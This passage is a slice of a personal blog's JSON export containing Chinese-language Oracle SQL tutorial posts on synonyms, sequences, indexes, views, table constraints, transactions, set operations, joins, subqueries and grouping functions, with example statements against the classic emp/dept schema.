退出容器（注意，不要exit退出，防止容器直接关闭了）","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[]},{"title":"同义词","slug":"同义词","date":"2022-05-12T22:14:01.000Z","updated":"2022-05-12T22:20:21.890Z","comments":true,"path":"2022/05/13/同义词/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/05/13/同义词/","excerpt":"","text":"同义词: 1 什么是同义词: 同义词就是别名. 2 同义词使用的场合. xiaohong想访问scott用户的emp表: 1234561 需要scott用户给xiaohong赋访问emp表的权限:grant select on emp to xiaohong;然后使用xiaohong用户登录oracle:sqlplus xiaohong/xiaohong@oracle;SQL&gt; select * from scott.emp;为了在访问scott.emp表的时候不用再使用scott.emp,可以给scott.emp创建同义词; 3 如何创建同义词: 12create synonym 同义词名 for 用户名.表名;create synonym emp for scott.emp; 如何创建一个新的oracle用户 12345678使用sys用户创建新的用户和给这个新用户添加权限: create user 用户名 identified by 密码; grant connect, resource to 用户名; --给用户添加连接权限,如果一个新用户没有连接权限的话,是无法连接到这个用户的 grant create synonym to 用户名; --给用户添加创建同义词的权限 create user xiaohei identified by xiaohei; grant connect, resource to xiaohei; grant create synonym to xiaohei; 4 删除同义词: 12drop synonym 同义词名;drop synonym emp; 5 查询同义词 1select synonym_name from user_synonyms;","categories":[{"name":"数据库","slug":"数据库","permalink":"https://xiaowuyoucy.github.io/categories/数据库/"}],"tags":[]},{"title":"序列","slug":"序列","date":"2022-05-12T21:56:38.000Z","updated":"2022-05-12T23:51:22.509Z","comments":true,"path":"2022/05/13/序列/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/05/13/序列/","excerpt":"","text":"可以理解成数组：默认，从[1]开始，长度[20] [1, 2, 3, 4, 5, 6, …, 20] 在内存中。 由于序列是被保存在内存中，访问内存的速率要高于访问硬盘的速率。所以序列可以提高效率。 序列: 1 序列的用处: 由于表的主键要求是非空且唯一的, 为了保证主键是非空和唯一的, 可以使用序列. ​ 2 创建序列 12create sequence 序列名;create sequence seq_mytest; 123456789101112131415-- Create sequence create sequence 序列名minvalue 最小值maxvalue 最大值start with 1 --开始值increment by 1 --步长cache 20; --容器大小-- Create sequence create sequence MYSEQminvalue 1maxvalue 9999999999999999999999999999start with 1increment by 1cache 20; 3 序列的属性 12345678currval 和 nextval, 但是第一次使用的时候先要取nextval的值.序列名.currval //获取当前序列序列名.nextval //获取下一个序列查看序列select 序列名.currval from dual; --duan是伪表select 序列名.nextval from dual; 4 删除序列 12drop sequence 序列名;drop sequence seq_mytest; 查看序列代码 1edit 序列名 查看序列 1select sequence_name from user_sequences; 查询序列的属性 1select * from user_sequences; --user_sequences为数据字典视图。 查看序列属性 1edit 序列名","categories":[{"name":"数据库","slug":"数据库","permalink":"https://xiaowuyoucy.github.io/categories/数据库/"}],"tags":[]},{"title":"索引","slug":"索引","date":"2022-05-12T21:50:24.000Z","updated":"2022-05-12T21:56:09.862Z","comments":true,"path":"2022/05/13/索引/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/05/13/索引/","excerpt":"","text":"索引:使用是索引的目的是提高查询的效率. 索引，相当于书的目录，提高数据检索速度。提高效率（视图不可以提高效率） 一种独立于表的模式对象, 可以存储在与表不同的磁盘或表空间中 索引被删除或损坏, 不会对表产生影响, 其影响的只是查询的速度 索引一旦建立, Oracle 管理系统会对其进行自动维护, 而且由 Oracle 管理系统决定何时使用索引. 用户不用在查询语句中指定使用哪个索引 在删除一个表时, 所有基于该表的索引会自动被删除 通过指针加速 Oracle 服务器的查询速度 通过快速定位数据的方法，减少磁盘 I/O 1 创建索引 12345create index 索引名 on 表名(列名);create index idx_emp on emp(empno);--emp(empno) 表名(列名) 一般列名使用主键列 2 删除索引 12drop index 索引名;drop index idx_emp_bak; 3 查询创建的索引 12select index_name from user_indexes;select xxxx_name from user_xxxxs; 4 索引的原理? 在查询的时候, where条件后面要使用创建索引的时候的列, oracle先查询索引表, 从索引表中找到该列的值对应的rowid, 找到rowid再从表中根据rowid找到那一行记录. 5 注意点: 创建索引的列最后是值的分布很广泛且重复的概率很低. ​ 下列情况不要创建索引: 表很小 列不经常作为连接条件或出现在WHERE子句中 查询的数据大于2%到4% 表经常更新","categories":[{"name":"数据库","slug":"数据库","permalink":"https://xiaowuyoucy.github.io/categories/数据库/"}],"tags":[]},{"title":"视图","slug":"视图","date":"2022-05-12T21:42:28.000Z","updated":"2022-05-12T21:49:28.654Z","comments":true,"path":"2022/05/13/视图/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/05/13/视图/","excerpt":"","text":"视图: 1 什么是视图: 视图本身没有数据, 数据存储在表中 ​ 2 如何创建视图 1234567create view vm_emp as select * from emp;create or replace view vm_emp as select * from emp;create or replace view vm_emp as select deptno, empno, ename from emp where deptno=10;-- or replace代表如果视图存在,就替换--查看视图select view_name from user_views; ​ 添加创建视图权限 12345添加步骤：1. 使用管理员登陆：sqlplus / as sysdba 2. 给scott用户增加权限： SQL&gt; grant create view to scott; 3. 执行“/”可成功创建视图empincomeview。 4. 视图的操作和表的操作完全一样。 SQL&gt; select * from empincomeview; 3 如何删除视图 12drop view 视图名;drop view vm_emp; 4 使用视图的优点: 可以限制用户对某些数据的访问; 可以简化查询; 5 使用视图注意点: 不要通过视图去修改表的数据. 可以将视图设置为只读属性:with read only 1create or replace view vm_emp as select * from emp with read only; 查看视图代码 1edit 视图名","categories":[{"name":"数据库","slug":"数据库","permalink":"https://xiaowuyoucy.github.io/categories/数据库/"}],"tags":[]},{"title":"表的创建和管理","slug":"表的创建和管理","date":"2022-05-12T19:16:25.000Z","updated":"2022-05-17T00:42:51.920Z","comments":true,"path":"2022/05/13/表的创建和管理/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/05/13/表的创建和管理/","excerpt":"","text":"创建前提条件：表空间的使用权限和create table的权限 基本的数据存储集合，由行和列组成。表名和列名遵循如下命名规则： 必须以字母开头 必须在 1–30 个字符之间 必须只能包含 A–Z, a–z, 0–9, _, $, 和 # 必须不能和用户定义的其他对象重名 必须不能是Oracle 的保留字 Oracle默认存储是都存为大写 数据库名只能是1~8位，datalink可以是128位，和其他一些特殊字符 创建表的数据类型 rowid：行地址 ——伪列 查看行地址 1select rowid, empno, deptno from emp 创建表的语句: 1234create table 表名(列名 类型, ...,列名 类型);create table tbl(id number, name varchar2(20));insert into tbl values(01, &apos;xiaoliu&apos;); 在创建表的时候为某一列设置默认值 1234create table tbl(id number, name varchar2(20), hiredate date default sysdate);//hiredate date default sysdate 如果hiredate为空,默认使用系统日期值insert into tbl(id, name) values(02, &apos;xiaohong&apos;); ---若没有插入hiredate的值, 则使用默认值 通过已有的表创建一个表, 相当于表结构的复制 1create table tbl_bak as select * from tbl where 1=2; 修改表 增加一个列 123alter table 表名 add 列名 类型;alter table tbl add email varchar2(30); 修改列属性 12alter table 表名 modify 列名 要修改的类型;alter table tbl modify email varchar2(40); 重命名列 12alter table 表名 rename column 旧列名 to 新列名;alter table tbl rename column email to address; 删除列 12alter table 表名 drop column 列名;alter table tbl drop column address; 表名的重命名 12rename 旧表名 to 新表名;rename t1 to t2; 删除表 12345drop table 表名; --删除的表可以闪回drop table 表名 purge; --purge的作用删除不经过回收站, 删除的表不可以闪回 drop table tbl; --删除的表可以闪回drop table tbl purge; --purge的作用删除不经过回收站, 删除的表不可以闪回 表的闪回:删除的表恢复回来 123456789101112实现过程: 1 create table tbl(id number, name varchar2(20)); 2 drop table tbl; 3 select * from tab; ---看tname那一列 4 show recyclebin; ----看ORIGINAL NAME那一列 5 flashback table tbl to before drop; 假如: drop table tbl purge; 则不能闪回了 1 drop table tbl purge; 2 select * from tab; 3 show recyclebin; 4 flashback table tbl to before drop; 表的约束: 表的约束（5种）： ○ 检查 (值是否符合预设的规则) ○ 非空 (not null) ○ 唯一 (不能重复) ○ 主键（非空+唯一） ○ 外键 (取值必须在另外一个表中存在) 如不给约束指定起名，那么oracle会自动给约束起名 为测试方便, 新建一个表, 与dept一样, 并添加主键(做就要是为了测试外键) 12create table dept_bak as select * from dept;alter table dept_bak add constraint pk_dept_bak primary key (DEPTNO); 使用约束的例子: 12345678910111213create table student( id number constraint pk_student primary key, ---主键(非空唯一) name varchar2(30) not null, --非空 email varchar2(30) unique, --唯一 sex varchar2(10) check(sex in (&apos;男&apos;,&apos;女&apos;)), --check约束 sal number check(sal&gt;10000), --check约束 deptno number(2) references dept_bak(deptno) on delete set null --当dept_bak表的数据被删除以后, 该列设置为null ); REFERENCES: 标示在父表中的列ON DELETE CASCADE(级联删除): 当父表中的列被删除时，子表中相对应的列也被删除ON DELETE SET NULL(级联置空): 子表中相应的列置空 给hiredate设置默认值 1alter table student add hiredate date default sysdate; 1 验证主键: 分两方面验证, 非空和唯一 12345先正常插入一条记录: insert into student(id, name, email, sex, sal, deptno) values(1000, &apos;xiaohong&apos;, &apos;helloworld@163.com&apos;, &apos;女&apos;, &apos;10001&apos;, 10);验证主键唯一性: insert into student(id, name, email, sex, sal, deptno) values(1000, &apos;xiaohong&apos;, &apos;helloworld@163.com&apos;, &apos;女&apos;, &apos;10001&apos;, 10);--报错, 1000与刚刚插入成功的重复了 验证主键非空: 1insert into student(id, name, email, sex, sal, deptno) values(null, &apos;xiaohong&apos;, &apos;helloworld@163.com&apos;, &apos;女&apos;, &apos;10001&apos;, 10); 2 验证非空: 使用name来进行验证 1insert into student(id, name, email, sex, sal, deptno) values(1001, null, &apos;hello@163.com&apos;, &apos;女&apos;, &apos;10001&apos;, 10); 3 验证唯一性: 通过email进行验证 1insert into student(id, name, email, sex, sal, deptno) values(1001, &apos;xiaoliu&apos;, &apos;helloworld@163.com&apos;, &apos;女&apos;, &apos;10001&apos;, 10); 4 验证check约束: 使用sex和sal进行验证 12345insert into student(id, name, email, sex, sal, deptno) values(1001, &apos;xiaoliu&apos;, &apos;xiaofang@163.com&apos;, &apos;无&apos;, &apos;10001&apos;, 10); --sex违反check条件,sex只能取&apos;男&apos;,&apos;女&apos;insert into student(id, name, email, sex, sal, deptno) values(1001, &apos;xiaoliu&apos;, &apos;xiaoyuan@163.com&apos;, &apos;女&apos;, 9000, 10); --sal违反check条件,sal&gt;10000 5 验证外键 12insert into student(id, name, email, sex, sal, deptno) values(1002, &apos;xiaoliu&apos;, &apos;xiaohua@163.com&apos;, &apos;女&apos;, &apos;10001&apos;, 11); ---dept表中不存在deptno为11的部门编号 1234a--cascade 级联删除, 主表记录删除的时候, 子表数据跟着删除b--drop table dept_bak cascade constraints;c--set null 设置为null, 主表删除的时候，子表该字段设为nulld--默认方式, 主表删除的时候, 如果子表引用了该字段的数据, 不能删除, 先删子表, 后删主表","categories":[{"name":"数据库","slug":"数据库","permalink":"https://xiaowuyoucy.github.io/categories/数据库/"}],"tags":[]},{"title":"事务","slug":"事务","date":"2022-05-11T22:06:16.000Z","updated":"2022-05-11T22:19:23.943Z","comments":true,"path":"2022/05/12/事务/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/05/12/事务/","excerpt":"","text":"1.1 事务 数据库事务，是由有限的数据库操作序列组成的逻辑执行单元，这一系列操作要么全部执行，要么全部放弃执行。 数据库事务由以下的部分组成: 一个或多个DML语句 一个 DDL(Data Definition Language – 数据定义语言) 语句 一个 DCL(Data Control Language – 数据控制语言) 语句 事务的特点：要么都成功，要么都失败。 事务的特性 事务4大特性(ACID) ：原子性、一致性、隔离性、持久性。 ​ 原子性 (Atomicity)：事务中的全部操作在数据库中是不可分割的，要么全部完成，要么均不执行。 ​ 一致性 (Consistency)：几个并行执行的事务，其执行结果必须与按某一顺序串行执行的结果相一致。 ​ 隔离性 (Isolation)：事务的执行不受其他事务的干扰，当数据库被多个客户端并发访问时，隔离它们的操 作，防止出现：脏读、幻读、不可重复读。 ​ 持久性 (Durability)：对于任意已提交事务，系统必须保证该事务对数据库的改变不被丢失，即使数据库出现故障。 事务的起始标志：Oracle中自动开启事务，以DML语句为开启标志。 ​ 执行一个增删改查语句，只要没有提交commit和回滚rollback，操作都在一个事务中。 事务的结束标志：提交、回滚都是事务的结束标志。 ​ 提交： 显示提交：commit ​ 隐式提交：1. 有DDL语句，如：create table除了创建表之外还会隐式提交Create之前所有没有提交的DML语句。 2. 正常退出(exit / quit) ​ 回滚： 显示回滚：rollback ​ 隐式回滚：掉电、宕机、非正常退出。 控制事务 savepoint ​ 保存点（savepoint）可以防止错误操作影响整个事务，方便进行事务控制。 123456789101112【示例】：1. SQL&gt; create table testsp ( tid number, tname varchar2(20)); DDL语句会隐式commit之前操作 2. set feedback on 打开回显 3. insert into testsp values(1, &apos;Tom&apos;) 4. insert into testsp values(2, &apos;Mary&apos;) 5. savepoint aaa 6. insert into testsp values(3, &apos;Moke&apos;) 故意将“Mike”错写成“Moke”。 7. select * from testsp 三条数据都显示出来。 8. rollback to savepoint aaa 回滚到保存点aaa 9. select * from testsp 发现表中的数据保存到第二条操作结束的位置需要注意，前两次的操作仍然没有提交。如操作完成应该显示的执行 commit 提交。savepoint主要用于在事务上下文中声明一个中间标记，将一个长事务分隔为多个较小的部分，和我们编写文档时，习惯性保存一下一样，都是为了防止出错和丢失。如果保存点设置名称重复，则会删除之前的那个保存点。一旦commit之后，savepoint将失效。 事物的隔离级别: 了解oracle是读已提交数据, mysql是可重复读. 保存点:使用保存点的目的是把一个大的事物分成几段进行保存, 类似于编写word文档的时候使用ctrl+s分段保存. 以实验的方式说明保存点的作用: 123456789101112131415161718192021create table testsp (tid number, tname varchar2(20)); insert into testsp values(1, &apos;Tom&apos;); insert into testsp values(2, &apos;Mary&apos;); savepoint aaa; insert into testsp values(3, &apos;Moke&apos;); savepoint bbb; update testsp set tname=&apos;tomson&apos; where tid=1; delete from testsp where tid=1; rollback to savepoint bbb; SQL&gt; select * from testsp; TID TNAME ---------- -------------------- 1 Tom 2 Mary 3 Moke rollback to savepoint aaa;--此时不能再回退到bbb rollback ;--事务结束 select * from testsp; **说明: 当执行commit或者rollback后保存点就会全部无效了. 隔离级别 对于同时运行的多个事务, 当这些事务访问数据库中相同的数据时, 如果没有采取必要的隔离机制, 就会导致各种并发问题: • 脏读: 对于两个事物 T1, T2, T1 读取了已经被 T2 更新但还没有被提交的字段. 之后, 若 T2 回滚, T1读取的内容就是临时且无效的. • 不可重复读: 对于两个事物 T1, T2, T1 读取了一个字段, 然后 T2 更新了该字段. 之后, T1再次读取同一个字段, 值就不同了. • 幻读: 对于两个事物 T1, T2, T1 从一个表中读取了一个字段, 然后 T2 在该表中插入了一些新的行. 之后, 如果 T1 再次读取同一个表, 就会多出几行. 数据库事务的隔离性: 数据库系统必须具有隔离并发运行各个事务的能力, 使它们不会相互影响, 避免各种并发问题. 一个事务与其他事务隔离的程度称为隔离级别. 数据库规定了多种事务隔离级别, 不同隔离级别对应不同的干扰程度, 隔离级别越高, 数据一致性就越好, 但并发性越弱 ​ SQL99定义4中隔离级别： ​ 1. Read Uncommitted 读未提交数据。(人家还没有提交你就查到了,一般不允许这样的) Read Commited 读已提交数据。 （Oracle默认） 3. Repeatable Read 可重复读。 （MySQL默认） 4. Serializable 序列化、串行化。 （查询也要等前一个事务结束） 这4种MySQL都支持 Oracle支持的隔离级别： Read Commited（默认）和 Serializable，以及Oracle自定义的Read Only三种。 Read Only：由于大多数情况下，在事务操作的过程中，不希望别人也来操作，但是如果将别人的隔离级别设置为Serializable（串行），但是单线程会导致数据库的性能太差。是应该允许别人来进行read操作的。 这是两个事务","categories":[{"name":"数据库","slug":"数据库","permalink":"https://xiaowuyoucy.github.io/categories/数据库/"}],"tags":[]},{"title":"数据处理","slug":"数据处理","date":"2022-05-11T20:41:56.000Z","updated":"2022-05-11T21:41:33.297Z","comments":true,"path":"2022/05/12/数据处理/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/05/12/数据处理/","excerpt":"","text":"sql语言的类型 ​ DML data manipulation language 数据操作语言，对应增删改查 ​ DDL data definition language 数据定义语言 create, drop, truncate ​ DCL data control language 数据控制语言 grant, revoke, commit, rollback 数据库中，称呼增删改查，为DML语句。(Data Manipulation Language 数据操纵语言)，就是指代： ​ insert、update、delete、select这四个操作。 DDL语句。(Data Definition Language 数据定义语言)。 如：truncate table(截断/清空 一张表) ​ create table(表)、create view(视图)、create index(索引)、create sequence(序列)、 ​ create synonym(同义词)、alter table、drop table。 DCL语句。DCL（Data Control Language数据控制语言）如： ​ commit(提交)、rollback(回滚) DML语句: 插入和拷贝 1234567891011121314151617181920212223241 insert语句: insert into tablename[col1,…] values(val1,…); --插入全部列 insert into dept values(51,&apos;51name&apos;,&apos;51loc&apos;); 插入所有的数据时,列名可以不写--插入部分列 insert into dept(deptno, dname) values(55, &apos;55name&apos;); --隐式插入null insert into dept(deptno,dname) values(52,&apos;52name&apos;); --显示插入null insert into dept(deptno,dname,loc) values(53,&apos;53name&apos;,null); --&amp;符号的使用: insert into dept(deptno, dname, loc) values(&amp;t1, &amp;t2, &amp;t3); 拷贝表结构: create table tname_YYYY_MM_DD as select * from tname_xxxxx where 1=2; ---where条件为假, 之拷贝表结构 批量插入: insert into tname_bak select * from tname where .....; 修改 123456782 update语句: update tablename set col1=val1, col2=val where cond; --修改emp表的员工名字为TOM_CAT的员工的薪水为原有薪水加100 update emp set sal=sal+100 where ename=&apos;TOM_CAT&apos;; --修改emp表的员工名字为TOM_CAT的员工的薪水为原有薪水加空 update emp set sal=null where ename=&apos;TOM_CAT&apos;; **注意: 在update的时候, null可以使用等号 **注意: 在update的时候, 一定要使用where条件, 否则会修改表中所有的记录 删除 1234567891011121314151617181920212223242526272829 3 delete语句: delete from tablename where cond; delete from emp where ename=&apos;TOM_CAT&apos;; delete from dept where ename = &amp;dpt; **注意: 在使用delete删除的时候一定要有where条件, 否则会删除整个表的记录 truncate table 表名; 删除表中所有数据,不可恢复 --delete和truncate的区别: 1. delete逐条删除表&quot;内容&quot;, truncate先摧毁表再重建。 (由于delete使用频繁，Oracle对delete优化后delete快于truncate)2. delete 是DML语句, truncate是DDL语句 DML语句可以闪回(flashback), DDL语句不可以闪回 （闪回:做错了一个操作并且commit了, 对应的撤销行为）3. 由于delete是逐条操作数据，所以delete会产生碎片，truncate不会产生碎片。 （同样是由于Oracle对delete进行了优化, 让delete不产生碎片）。 两个数据之间的数据被删除, 删除的数据——碎片, 整理碎片, 数据连续, 行移动4. delete不会释放空间, truncate会释放空间 用delete删除一张10M的表, 空间不会释放。而truncate会。所以当确定表不再使用，应truncate5. delete可以回滚rollback, truncate不可以回滚rollback实验验证一些delete和truncate 通过实验比较, truncate删除的效率比delete快.打开时间回显: SQL&gt; set timing on;关闭时间回显: SQL&gt; set timing off; 批量插入 123start 脚本名.sql或@ 脚本名.sql","categories":[{"name":"数据库","slug":"数据库","permalink":"https://xiaowuyoucy.github.io/categories/数据库/"}],"tags":[]},{"title":"集合运算","slug":"集合运算","date":"2022-05-11T19:54:37.000Z","updated":"2022-05-30T16:02:56.403Z","comments":true,"path":"2022/05/12/集合运算/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/05/12/集合运算/","excerpt":"","text":"​ union 两个集合相同的部分保留一份 ​ union all 两个集合相同的部分都保留 ​ intersect 两个集合交集只保留相同的部分 ​ minus 集合A-集合B，减去A和B都有的部分, 保留A中与B不同的部分 ​ select * from emp where deptno = 10 union select * from emp where deptno=20; select * from emp where deptno = 10 union select * from emp where deptno in(20,10); select * from emp where deptno = 10 union all select * from emp where deptno in(20,10); select * from emp where deptno = 10 intersect select * from emp where deptno in(20,10); select * from emp where deptno in(10,30) minus select * from emp where deptno in(20,10); 总结: 使用集合运算要保证列数一样多, 前后的列的类型要一致 1.1 集合运算需要注意的问题： 参与运算的各个集合必须列数相同，且类型一致。 采用第一个集合的表头作为最终使用的表头。 (别名也只能在第一个集合上起) 可以使用括号()先执行后面的语句。 问题：按照部门统计各部门不同工种的工资情况，要求按如下格式输出： 分析SQL执行结果。 ​ 第一部分数据是按照deptno和job进行分组；select 查询deptno、job、sum(sal) ​ 第二部分数据是直接按照deptno分组即可，与job无关；select 只需要查询deptno，sum(sal) ​ 第三部分数据不按照任何条件分组，即group by null；select 查询sum(sal) 所以，整体查询结果应该= group by deptno，job + group by deptno + group by null ​ 按照集合的要求,必须列数相同,类型一致,所以写法如下,使用null强行占位! 12345SQL&gt; select deptno,job,sum(sal) from emp group by deptno,jobunionselect deptno,to_char(null),sum(sal) from emp group by deptnounionselect to_number(null),to_char(null),sum(sal) from emp; 需要注意:集合运算的性能一般较差. SQL的执行时间： 1set timing on/off 默认是off","categories":[{"name":"数据库","slug":"数据库","permalink":"https://xiaowuyoucy.github.io/categories/数据库/"}],"tags":[]},{"title":"笛卡尔积的概念","slug":"笛卡尔积的概念","date":"2022-05-11T19:10:45.000Z","updated":"2022-05-11T19:55:20.425Z","comments":true,"path":"2022/05/12/笛卡尔积的概念/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/05/12/笛卡尔积的概念/","excerpt":"","text":"​ 笛卡尔集的行数 = table1的行数 x table2的行数 ​ 笛卡尔集的列数 = table1的列数 + table2的列数 在操作笛卡尔集的时候，应该避免使用“笛卡尔全集”，因为里面含有大量错误信息。 多表查询就是按照给定条件(连接条件)，从笛卡尔全集中选出正确的结果。 笛卡尔积的数据集合中有一些是无效的数据, 需要进行过滤, 对于有2个表的的笛卡尔积, 需要一个条件, 对于n个表需要n-1个条件. 对于多表查询, 首先会生成笛卡尔积, 笛卡尔积里面会有无效的数据, 此时需要过滤筛选. 等值连接(结合笛卡尔积讲解) 查询员工信息：员工号 姓名 月薪(emp)和部门名称(dept) 123分析: 员工号 姓名 月薪 这三个字段在emp表中, 部门名称在dept表中 select e.empno, e.ename, e.sal, d.dname from emp e, dept d where e.deptno=d.deptno; 不等值连接(结合笛卡尔积讲解) 查询员工信息：员工号 姓名 月薪(emp) 和 薪水级别(salgrade表) 1select e.empno, e.ename, e.sal, s.grade from emp e, salgrade s where e.sal between s.losal and s.hisal; 按部门统计员工人数, 显示如下信息： 部门号 部门名称 人数 12select d.deptno, d.dname, count(e.empno) from emp e, dept d where e.deptno=d.deptno group by d.deptno, d.dname;部门表中40号部门没有被统计上, 如何将40号部门也统计上呢??? 右外连接 1select d.deptno, d.dname, count(e.empno) from emp e, dept d where e.deptno(+)=d.deptno group by d.deptno, d.dname; 解释一下count(*)和count(e.empno)的区别 12count(*): 只要一行中有一个字段不为空就被统计上count(e.empno): 只有e.empno不为空才会被统计上 左外连接 1select d.deptno, d.dname, count(e.empno) from emp e, dept d where d.deptno=e.deptno(+) group by d.deptno, d.dname; 自连接 查询员工信息：xxx的老板是 yyy 123分析: emp表中的mgr列表示员工的老板的员工编号, 可以将emp表分别看做员工表和老板表, 员工表的老板是老板表的员工:select e.ename || &apos; 的老板是 &apos; || nvl(b.ename, &apos; HIS WIFE&apos;) from emp e, emp b where e.mgr=b.empno(+); 子查询(sql嵌套sql) 查询比SCOTT工资高的员工信息 123456789分析: 可以分两部查找, 第一步: 查找SCOTT的工资 select sal from emp where ename = &apos;SCOTT&apos;; ---3000.00 第二步: 将上一步得到的结果作为第二部查询的条件 select * from emp where sal&gt;3000; 可以使用子查询方法将两步合成一步: select * from emp where sal&gt;(select sal from emp where ename = &apos;SCOTT&apos;); 关于子查询的10点注意事项: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960611 合理的书写风格 (如上例，当写一个较复杂的子查询的时候，要合理的添加换行、缩进), 可以借助PL/SQL Developer工具 2 使用小括号 3 主查询和子查询可以是不同表，只要子查询返回的结果主查询可以使用即可 --查询部门名称是&quot;SALES&quot;的员工信息: 分析: 部门名称在dept表中, dept表与emp表是通过deptno联系在一起的. --使用子查询 select * from emp where deptno=(select deptno from dept where dname=&apos;SALES&apos;); --使用多表查询 select e.* from emp e, dept d where e.deptno=d.deptno and d.dname=&apos;SALES&apos;; 4 可以在主查询的where、select、having、from后都可以放置子查询 a 在select后使用子查询的情况: 查询10号部门员工号, 员工姓名, 部门编号, 部门名称 select e.empno, e.ename, e.deptno,(select dname from dept where deptno=10) from emp e where e.deptno=10; 注意点: 在select后面使用子查询必须保证子查询结果只返回一条记录. b 在having后面使用子查询的情况: 查询部门平均工资高于30号部门平均工资的部门和平均工资 1 先查询30号部门的平均工资 select avg(sal) from emp where deptno=30; 2 查询每个部门的平均工资 select deptno, avg(sal) from emp group by deptno; 3 select deptno, avg(sal) from emp group by deptno having avg(sal) &gt; (select avg(sal) from emp where deptno = 30); 5 不可以在主查询的group by后面放置子查询 (SQL语句的语法规范) 6 强调：在from后面放置的子查询(***), from后面放置是一个集合(表、查询结果) 7 单行子查询只能使用单行操作符, 多行子查询只能使用多行操作符(前面的&gt; &lt; = 都是单行操作符, 接下来说的是多行操作符) 多行操作符有 IN ANY(任意一个) ALL （所有） --查询部门名称为SALES和ACCOUNTING的员工信息 select * from emp where deptno in (select deptno from dept where dname in (&apos;SALES&apos;, &apos;ACCOUNTING&apos;)); --查询薪水比30号部门任意一个(某一个 ANY )员工高的员工信息 select * from emp where sal &gt;(select min(sal) from emp where deptno=30); select * from emp where sal &gt;(select sal from emp where deptno=30); --错误 select * from emp where sal &gt;any(select sal from emp where deptno=30); --查询比30号部门所有人工资高的员工信息 select * from emp where sal&gt;(select max(sal) from emp where deptno=30); select * from emp where sal&gt;all(select sal from emp where deptno=30); 8 一般不在子查询中使用order by, 但在Top-N分析问题中，必须使用order by 9 一般先执行子查询(内查询)，再执行主查询(外查询)；但是相关子查询除外 10 子查询中的null值 --查询不是老板的员工信息 分析: 可以先查询谁是老板 select distinct mgr from emp; select * from emp where empno not in (select distinct mgr from emp); select * from emp where empno not in (select distinct mgr from emp where mgr is not null); 总结: not in 后面集合中不能出现null empno not in(a, b, null)---&gt; empno!=a and empno!=b and empno!=null; 123456789101112131415161718192021222324252627282930313233思考题? 查询员工的姓名、薪水和年薪? select * from ____________; select * from (select ename, sal, sal*12 from emp); 总结: 可以将查询的结果集当成一张表来使用. 也就是说, from后面既可以是表名, 也可以是select查询的结果集. c 在where后使用子查询的情况: --查询比平均工资高的员工的信息? 1 查询平均工资 select avg(sal) from emp; 2 select * from emp where sal&gt;2073; 合成一步: select * from emp where sal&gt;(select avg(sal) from emp); d 在having后使用子查询的情况: --查询最低薪水高于30号部门最低薪水的部门及其最低薪水 1 先得到30部门的最低薪水 select min(sal) from emp where deptno=30; --950 2 得到各个部门的最低薪水 select deptno, min(sal) from emp group by deptno; 3 使用条件进行过滤 select deptno, min(sal) from emp group by deptno having min(sal) &gt; 950; 将三步合并写成: select deptno, min(sal) from emp group by deptno having min(sal) &gt; (select min(sal) from emp where deptno = 30);","categories":[{"name":"数据库","slug":"数据库","permalink":"https://xiaowuyoucy.github.io/categories/数据库/"}],"tags":[]},{"title":"分组函数和分组数据","slug":"分组函数和分组数据","date":"2022-05-11T17:23:56.000Z","updated":"2022-05-11T18:02:21.851Z","comments":true,"path":"2022/05/12/分组函数和分组数据/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/05/12/分组函数和分组数据/","excerpt":"","text":"分组函数:也称之为组函数或者聚合函数, oracle提供的常用的分组函数有:sum, avg, count, max, min 1 统计员工总数 1select count(empno) from emp; 2 统计工种总数 12select count(job) from emp; select count(distinct job) from emp; 3 求员工的平均工资 1select avg(sal) from emp; 4 求员工的平均奖金 1select avg(comm), sum(comm)/count(comm), sum(comm)/count(empno) from emp; 5 求员工表中最高工资和最低工资 1select max(sal), min(sal) from emp; 6 如何去掉分组函数的滤空功能呢?? --提示: nvl函数 1select count(nvl(empno)) from emp; 结论: 分组函数具有滤空功能. ​ 分组数据: 借助execl理解分组功能. 12基本格式 : select ..., count() from emp where ... group by .. 说明: 按照group by 后给定的表达式，将from后面的table进行分组, 针对每一组, 使用组函数。 1 统计各个部门的平均工资？ 1select deptno, avg(sal) from emp group by deptno; 2 统计各个部门不同工种的平均工资? 123456select deptno, job, avg(sal) from emp group by deptno, job;结论: 请思考通过案例1和案例2得出什么样的结论?? select后面的列和group后面的列有什么关系? select a, b, c.., count(f) from table group by a, b, c select后面没有出现在分组函数中的列名, 一定要出现在group by子句中. 在group by子句中出现的列, 不要求一定出现在select后面的列中 3 统计各个部门平均工资高于2000? 123select deptno, avg(sal) from emp group by deptno having avg(sal)&gt;2000; 结论:对分组数据进行过滤, 不能够使用where, 应该使用having 4 求10号部门员工的平均薪水 12345678910111213方法1: select deptno,avg(sal) from emp where deptno=10 group by deptno;方法2: select deptno,avg(sal) from emp group by deptno having deptno=10; 结论:比较两种方法, 应该优先使用那种方法?? 第一种方法比第二种方法效率高,原因是第一种是先过滤然后再分组 第二种方法是先处理大量的数据,然后再过滤 使用分组函数统计分组数据不当的情况:select deptno job avg(sal) from emp group by deptno //出错select deptno avg(sal) from emp group by deptno,job //没有意义 where和having 1 where用于对数据第一次过滤 ,having只能用于分组后的数据过滤 2 如果where和having同时出现,则where应该出现在having前面","categories":[{"name":"数据库","slug":"数据库","permalink":"https://xiaowuyoucy.github.io/categories/数据库/"}],"tags":[]},{"title":"条件表达式","slug":"条件表达式","date":"2022-05-11T16:19:03.000Z","updated":"2022-05-11T17:13:41.651Z","comments":true,"path":"2022/05/12/条件表达式/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/05/12/条件表达式/","excerpt":"","text":"例子：老板打算给员工涨工资, 要求： ​ 总裁(PRESIDENT)涨1000，经理(MANAGER)涨800，其他人涨400. 请将涨前，涨后的薪水列出。 select ename, job, sal 涨前薪水, 涨后薪水 from emp 涨后的薪水是根据job来判断的 思路： if 是总裁(‘PRESIDENT’) then +1000 ​ else if 是经理(‘MANAGER’) then +800 ​ else +400 但是在SQL中无法实现if else 逻辑。当有这种需求的时候，可以使用case 或者 decode case： 是一个表达式，其语法为： 